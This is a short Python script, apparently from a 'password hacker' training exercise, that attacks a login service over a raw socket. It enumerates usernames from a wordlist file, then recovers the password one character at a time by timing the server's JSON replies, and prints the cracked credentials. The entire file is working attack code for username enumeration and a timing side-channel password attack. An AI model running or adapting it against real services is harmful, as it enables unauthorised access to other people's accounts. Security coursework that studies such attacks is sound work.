import sys
import socket
import itertools
import json
from datetime import datetime

logins = []

with open('hacking/logins.txt', 'r', encoding='utf-8') as f:
    for line in f:
        logins.append(line.strip())

symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'


def generate_password():
    index = 1
    while True:
        yield from itertools.product(symbols, repeat=index)
        index += 1


with socket.socket() as sock:
    sock.connect((sys.argv[1], int(sys.argv[2])))
    creds = {'login': '', 'password': ' '}

    for login in logins:
        creds['login'] = login
        json_creds = json.dumps(creds, indent=4)
        sock.send(json_creds.encode())
        json_response = sock.recv(1024).decode()
        response = json.loads(json_response)

        if response['result'] == 'Wrong login!':
            continue
        if response['result'] == 'Wrong password!':
            break

    while True:
        is_success = False
        for c in symbols:
            old_pas = creds['password']

            if creds['password'] == ' ':
                creds['password'] = c
            else:
                creds['password'] = creds['password'] + c

            json_creds = json.dumps(creds, indent=4)

            start = datetime.now()

            sock.send(json_creds.encode())
            json_response = sock.recv(1024).decode()

            finish = datetime.now()
            difference = finish - start

            response = json.loads(json_response)

            if response['result'] == 'Connection success!':
                is_success = True
                break

            if difference.microseconds >= 100000:
                continue
            else:
                creds['password'] = old_pas
                continue

        if is_success:
            break

    print(json.dumps(creds))
